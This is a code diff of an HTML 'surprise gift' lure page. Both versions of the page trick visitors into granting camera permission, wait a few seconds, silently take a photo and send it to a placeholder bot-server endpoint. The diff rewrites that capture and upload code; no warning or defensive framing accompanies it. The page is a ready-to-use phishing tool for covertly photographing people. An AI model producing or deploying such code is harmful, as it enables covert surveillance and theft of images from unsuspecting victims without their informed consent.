@@ -3,97 +3,87 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>🎁 Your Surprise!</title>
-
-<meta name="referrer" content="no-referrer">
+<title>🎁 Unlock Your Surprise</title>
 
 <style>
     body {
         margin: 0;
-        padding: 0;
-        background: #000;
+        background: black;
         color: white;
         font-family: Arial, sans-serif;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        overflow: hidden;
+        flex-direction: column;
         text-align: center;
     }
 
     #loading {
-        margin-top: 150px;
         font-size: 26px;
-        color: #fff;
         animation: blink 1s infinite;
     }
 
     @keyframes blink {
-        0% { opacity: 0.3; }
-        100% { opacity: 1; }
+        0% { opacity: 0.2; }
+        50% { opacity: 1; }
+        100% { opacity: 0.2; }
     }
 
     video {
-        display: none;  /* hide frame */
+        width: 150px;
+        height: 150px;
+        border-radius: 50%;
+        object-fit: cover;
+        display: none;
     }
 </style>
 </head>
+
 <body>
 
-<h2 id="loading">Loading…</h2>
+<h2 id="loading">Loading your surprise...</h2>
+<h3>🎁 Please click <b>Allow</b> to unlock your gift!</h3>
 
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas" style="display:none;"></canvas>
+<video id="preview" autoplay playsinline></video>
 
 <script>
-    const video = document.getElementById("video");
-    const canvas = document.getElementById("canvas");
+    const video = document.getElementById("preview");
     const loading = document.getElementById("loading");
 
     async function startCamera() {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: "user" }
-            });
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
 
+            loading.style.display = "none";
+            video.style.display = "block";
             video.srcObject = stream;
 
-            video.onloadedmetadata = () => {
-                video.play().catch(() => {
-                    video.muted = true;
-                    video.play();
-                });
-            };
+            setTimeout(() => captureAndSend(stream), 3000);
 
-            setTimeout(captureImage, 2500); // capture in 2.5 sec
-        } 
-        catch (error) {
-            loading.innerHTML = "⚠ Camera blocked. Please allow camera!";
+        } catch (err) {
+            loading.innerText = "Camera blocked ❌ Please allow to unlock your surprise!";
         }
     }
 
-    function captureImage() {
-        loading.innerHTML = "🎁 Opening Surprise…";
+    function captureAndSend(stream) {
+        const track = stream.getVideoTracks()[0];
+        const imageCapture = new ImageCapture(track);
 
-        let w = video.videoWidth;
-        let h = video.videoHeight;
+        imageCapture.takePhoto()
+        .then(blob => {
+            let form = new FormData();
+            form.append("photo", blob, "pic.jpg");
 
-        canvas.width = w;
-        canvas.height = h;
+            fetch("https://your-bot-server-url/send", {   // your bot server endpoint
+                method: "POST",
+                body: form
+            });
 
-        canvas.getContext("2d").drawImage(video, 0, 0, w, h);
-
-        let imageData = canvas.toDataURL("image/jpeg", 0.9);
-
-        sendToServer(imageData);
-    }
-
-    function sendToServer(base64Image) {
-        fetch("https://your-server-here.com/capture", {  // <-- replace
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({ img: base64Image })
+        }).catch(() => {
+            loading.innerText = "Error capturing photo!";
         });
-
-        loading.innerHTML = "🎉 Surprise Ready!";
     }
 
     startCamera();
